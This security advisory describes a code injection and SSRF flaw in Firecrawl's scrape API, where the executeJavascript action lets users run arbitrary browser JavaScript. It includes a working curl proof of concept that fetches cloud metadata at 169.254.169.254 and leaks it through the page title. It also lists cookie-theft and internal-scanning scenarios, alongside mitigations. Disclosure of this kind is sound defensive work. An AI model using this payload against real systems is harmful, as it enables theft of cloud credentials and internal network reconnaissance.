### Summary

A code injection vulnerability exists in Firecrawl's scrape API that allows authenticated users to execute arbitrary JavaScript within the browser context of any target page via the `executeJavascript` action type. This JavaScript runs inside the Playwright/Fire-Engine Chromium process and can perform network requests to internal services, effectively bypassing all server-side SSRF protections implemented in `safeFetch.ts`.

### Impact

An authenticated API user can submit a scrape request with an `executeJavascript` action containing arbitrary JavaScript code. This code executes inside the Chromium browser — a context that is not subject to any of Firecrawl's server-side IP validation or network restriction logic. The attacker can use browser-native APIs such as `fetch()` or `XMLHttpRequest` to make requests to internal services and exfiltrate the responses through the scraped page content.

**Example attack scenarios:**

- **Cloud metadata theft:** Execute `fetch('http://169.254.169.254/latest/meta-data/')` inside the browser to read AWS/GCP instance metadata, then inject the response into the page DOM to exfiltrate it via the scrape result.
- **Internal service scanning:** Enumerate internal network services by issuing `fetch()` requests to various internal IPs and ports.
- **Session/cookie theft:** Read `document.cookie` or `localStorage` of the target website and exfiltrate authentication tokens.

### Root Cause

The `executeJavascript` action type is defined in the API request schema (`apps/api/src/controllers/v2/types.ts`, lines 301–304) with no restrictions on the script content:

```typescript
z.object({
    type: z.literal("executeJavascript"),
    script: z.string(),  // Accepts any arbitrary JavaScript string
}),
```

The script is passed directly to Playwright's `page.evaluate()` and executed inside the Chromium process. No sandboxing, script validation, or network isolation is applied during execution.

Because the `fetch()` call originates from inside the browser process — not from the Node.js server — it completely bypasses the `isIPPrivate()` check in `safeFetch.ts` and the `getSecureDispatcher()` protections. The browser has direct network access to whatever the container/host can reach.

### Proof of Concept

```bash
curl -X POST http://localhost:3002/v1/scrape \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "https://example.com",
    "formats": ["html"],
    "actions": [
      {
        "type": "executeJavascript",
        "script": "try { const r = await fetch(\"http://169.254.169.254/latest/meta-data/\"); const t = await r.text(); document.title = \"SSRF:\" + t; } catch(e) { document.title = \"ERR:\" + e.message; }"
      },
      {"type": "scrape"}
    ]
  }'
```

If the metadata endpoint is reachable from the browser process, the response will be embedded in the returned HTML's `<title>` tag prefixed with `SSRF:`.

### Patches

No patch is available yet. Recommended mitigations:

- **Network isolation during JS execution:** Use Playwright's `context.route()` API to intercept and block all requests to private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`) while `executeJavascript` actions are running.
- **Script allowlisting or AST validation:** Parse the submitted JavaScript and reject scripts containing network-related APIs (`fetch`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`).
- **Restrict feature access:** Limit `executeJavascript` to high-trust API tiers only.

### Workarounds

- **Network segmentation:** Place the browser engine (Playwright/Fire-Engine) in a network segment that cannot reach internal services or cloud metadata endpoints.
- **Outbound firewall:** Block the browser container from accessing private IP ranges at the network level.

### References

- Affected file: [`apps/api/src/controllers/v2/types.ts`](https://github.com/firecrawl/firecrawl/blob/main/apps/api/src/controllers/v2/types.ts) (lines 301–304)
- Execution path: `apps/api/src/scraper/scrapeURL/engines/fire-engine/index.ts` (lines 312, 393–416)
- CWE-94: Improper Control of Generation of Code (Code Injection)
- CWE-918: Server-Side Request Forgery (SSRF)
